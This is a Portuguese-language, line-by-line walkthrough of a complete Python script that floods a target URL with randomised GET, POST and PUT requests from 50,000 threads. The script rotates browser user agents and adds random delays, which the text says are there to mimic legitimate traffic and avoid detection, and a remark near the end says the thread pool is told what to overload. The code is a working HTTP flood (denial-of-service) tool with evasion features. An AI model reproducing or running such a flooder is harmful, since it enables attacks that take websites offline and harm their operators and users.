### Importação de Bibliotecas

```python
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

```

- **import requests**: Importa a biblioteca `requests`, que é uma ferramenta poderosa e fácil de usar para fazer requisições HTTP em Python.
- **import random**: Importa a biblioteca `random`, que contém funções para gerar números aleatórios e realizar escolhas aleatórias, úteis para simular dados variados.
- **import string**: Importa a biblioteca `string`, que fornece um conjunto de constantes úteis, como `ascii_letters` (todas as letras do alfabeto) e `digits` (todos os dígitos de 0 a 9), que são usadas para criar strings aleatórias.
- **import time**: Importa a biblioteca `time`, usada para controlar o tempo e introduzir atrasos nas operações, ajudando a mimetizar tráfego legítimo.
- **from concurrent.futures import ThreadPoolExecutor, as_completed**: Importa `ThreadPoolExecutor` e `as_completed` da biblioteca `concurrent.futures`, que são usados para gerenciar a execução de threads de forma concorrente, permitindo a execução paralela de várias tarefas.

### Definição de Variáveis e Constantes

```python
# Target URL
url = ""

# List of user agents to rotate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.78 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

```

- **url = ""**: Declara uma variável `url` que deve ser preenchida com a URL alvo das requisições.
- **user_agents**: Uma lista de diferentes `User-Agent` strings. Cada string representa um navegador e sistema operacional diferente. Isso é usado para simular requisições de diferentes origens, ajudando a evitar bloqueios baseados em padrões de requisição.

### Funções Auxiliares

### Geração de Parâmetros Aleatórios

```python
def generate_random_query():
    query = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return {query: query}

```

- **def generate_random_query():** Define uma função chamada `generate_random_query` que não recebe argumentos.
- **query = ''.join(random.choices(string.ascii_letters + string.digits, k=8))**: Cria uma string aleatória de 8 caracteres composta de letras (maiúsculas e minúsculas) e dígitos. A função `random.choices()` seleciona aleatoriamente 8 caracteres da combinação de `string.ascii_letters` e `string.digits`, e `''.join()` junta esses caracteres em uma string única.
- **return {query: query}**: Retorna um dicionário onde a chave e o valor são a string aleatória gerada. Isso é usado como parâmetros de consulta para as requisições GET.
- 

A função `generate_random_query` é definida sem argumentos porque sua única responsabilidade é gerar uma string aleatória e retornar um dicionário com essa string como chave e valor. Vamos detalhar por que não há necessidade de argumentos nesta função:

### Objetivo da Função

O objetivo principal da função é gerar uma string aleatória e estruturá-la em um dicionário. Não há necessidade de informações externas ou entradas adicionais para realizar essa tarefa.

### Simplicidade

Manter a função sem argumentos simplifica seu uso e chamada. A função pode ser chamada diretamente, sem a necessidade de fornecer parâmetros, o que a torna fácil de usar em diferentes contextos.

### Exemplo de Uso

Vamos ver um exemplo de como essa função poderia ser usada:

```python
# Suponha que precisamos gerar várias consultas aleatórias
for _ in range(5):
    random_query = generate_random_query()
    print(random_query)

```

Aqui, a função `generate_random_query` é chamada cinco vezes para gerar cinco consultas aleatórias, e em cada chamada, ela cria uma string aleatória sem a necessidade de argumentos adicionais.

### Flexibilidade

### Geração de Dados Aleatórios

```python
def generate_random_data():
    return {
        ''.join(random.choices(string.ascii_letters, k=5)): ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        for _ in range(5)
    }

```

- **def generate_random_data():** Define uma função chamada `generate_random_data` que não recebe argumentos.
- **return {...}**: Retorna um dicionário.
- **''.join(random.choices(string.ascii_letters, k=5))**: Cria uma chave para o dicionário, composta de 5 letras aleatórias.
- **''.join(random.choices(string.ascii_letters + string.digits, k=10))**: Cria um valor para o dicionário, composto de 10 caracteres alfanuméricos aleatórios.
- **for _ in range(5)**: Repete o processo 5 vezes para gerar um dicionário com 5 pares chave-valor. Cada par é gerado de forma independente, resultando em dados de formulário variados.

### Envio de Requisição

```python
def send_request(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": url
            }
            params = generate_random_query()
            data = generate_random_data()

            # Randomly choose the request type with higher probability for PUT and POST
            request_type = random.choices(['GET', 'POST', 'PUT'], weights=[1, 3, 3])[0]

            if request_type == 'GET':
                response = requests.get(url, headers=headers, params=params)
            elif request_type == 'POST':
                response = requests.post(url, headers=headers, data=data)
            elif request_type == 'PUT':
                response = requests.put(url, headers=headers, data=data)

            print(f"{request_type} request sent! Status code: {response.status_code}")
            time.sleep(random.uniform(0.5, 2.0))  # Adding delay to mimic legitimate traffic
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            break

```

- **def send_request(url):** Define uma função chamada `send_request` que recebe um argumento `url`.
- **while True:** Inicia um loop infinito, que permite o envio contínuo de requisições até que ocorra uma exceção.
- **try:** Inicia um bloco de código que tentará executar as instruções, permitindo capturar e tratar exceções.
- **headers = {...}:** Define um dicionário de cabeçalhos HTTP para a requisição.
    - **"User-Agent": random.choice(user_agents):** Seleciona aleatoriamente um `User-Agent` da lista `user_agents`, simulando requisições de diferentes navegadores.
    - **"Referer": url:** Define o cabeçalho `Referer` com o valor da URL alvo, o que pode ajudar a simular requisições que parecem legítimas.
- **params = generate_random_query():** Chama a função `generate_random_query` para obter parâmetros de consulta aleatórios.
- **data = generate_random_data():** Chama a função `generate_random_data` para obter dados de formulário aleatórios.
- **request_type = random.choices(['GET', 'POST', 'PUT'], weights=[1, 3, 3])[0]:** Seleciona aleatoriamente um tipo de requisição (`GET`, `POST` ou `PUT`) com uma maior probabilidade para `POST` e `PUT`.
- **if request_type == 'GET':** Verifica se o tipo de requisição selecionado é `GET`.
    - **response = requests.get(url, headers=headers, params=params):** Envia uma requisição `GET` para a URL alvo com os cabeçalhos e parâmetros definidos.
- **elif request_type == 'POST':** Verifica se o tipo de requisição selecionado é `POST`.
    - **response = requests.post(url, headers=headers, data=data):** Envia uma requisição `POST` para a URL alvo com os cabeçalhos e dados definidos.
- **elif request_type == 'PUT':** Verifica se o tipo de requisição selecionado é `PUT`.
    - **response = requests.put(url, headers=headers, data=data):** Envia uma requisição `PUT` para a URL alvo com os cabeçalhos e dados definidos.
- **print(f"{request_type} request sent! Status code: {response.status_code}"):** Imprime uma mensagem indicando o tipo de requisição enviada e o status da resposta recebida.
- **time.sleep(random.uniform(0.5, 2.0)):** Introduz um atraso aleatório entre 0.5 e 2.0 segundos, ajudando a simular tráfego legítimo e evitar detecção.
- **except requests.exceptions.RequestException as e:** Captura exceções relacionadas a requisições HTTP.
    - **print(f"Request failed: {e}"):** Imprime uma mensagem indicando que a requisição falhou e mostra a exceção.
    - **break:** Interrompe o loop infinito em caso de exceção, parando o envio de requisições.

### Função Principal

```python
def main():
    website_url = url  # Example URL that returns status 200
    num_threads = 50000

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request, website_url) for _ in range(num_threads)]

        for future in as_completed(futures):
            future.result() #envia req uma por uma e só envia a proxima depois que a proxima for confirmada que enviou. e se acontecer algum erro no trajeto reenvia

if __name__ == "__main__":
    main()

```

passando a função send req e o web site para os futures para o threadpool saber o q sobrecarregar 

### Resumo

- **`ThreadPoolExecutor`** gerencia um pool de threads para execução paralela.
- **`executor.submit()`** envia tarefas para execução nas threads do pool.
- **`as_completed()`** permite processar os resultados das tarefas à medida que elas são concluídas.
- **`future.result()`** recupera o resultado da execução ou lança uma exceção se ocorreu um erro.
- **`futures`**: É uma lista de objetos `Future` retornados por `executor.submit(send_request, website_url)`. Cada `Future` representa uma requisição que foi enviada e está sendo processada.

### Iteração Sobre as Tarefas Concluídas

- **`for future in as_completed(futures):`**: Este loop itera sobre cada `Future` conforme ele é concluído. Isso significa que o loop processa as requisições na ordem em que terminam, não na ordem em que foram iniciadas.
    - A vantagem de usar `as_completed` é que você pode começar a processar os resultados das requisições assim que elas terminam, sem esperar que todas sejam concluídas.

### Recuperando o Resultado

- **`future.result()`**: Este método bloqueia até que o `Future` seja concluído e, em seguida, retorna o resultado da função que foi submetida (neste caso, `send_request`).
    - Se a função `send_request` executou corretamente, `result()` retorna o valor retornado por `send_request` (o conteúdo da resposta HTTP).
    - Se a função `send_request` gerou uma exceção, `result()` irá relançar essa exceção, permitindo que ela seja tratada no contexto onde `result()` foi chamado.
- 
- 
- **def main():** Define a função principal `main` que orquestra a execução do código.

- **website_url = url:** Atribui o valor da variável `url` à variável `website_url`. Esta URL deve ser preenchida com a URL alvo das requisições.
- **num_threads = 50000:** Define o número de threads a serem usadas.
- **with ThreadPoolExecutor(max_workers=num_threads) as executor:** Cria um `ThreadPoolExecutor` com o número de threads especificado, permitindo a execução de múltiplas tarefas de forma concorrente.
    - **futures = [executor.submit(send_request, website_url) for _ in range(num_threads)]:** Submete a função `send_request` ao executor para ser executada em múltiplas threads, passando `website_url` como argumento. Isso cria uma lista de objetos `Future`.
- **for future in as_completed(futures):** Itera sobre as tarefas concluídas.
    - **future.result():** Chama `result()` em cada `Future`, o que pode ser usado para verificar exceções ou resultados das tarefas. Neste caso, ele bloqueia até que todas as threads tenham terminado.
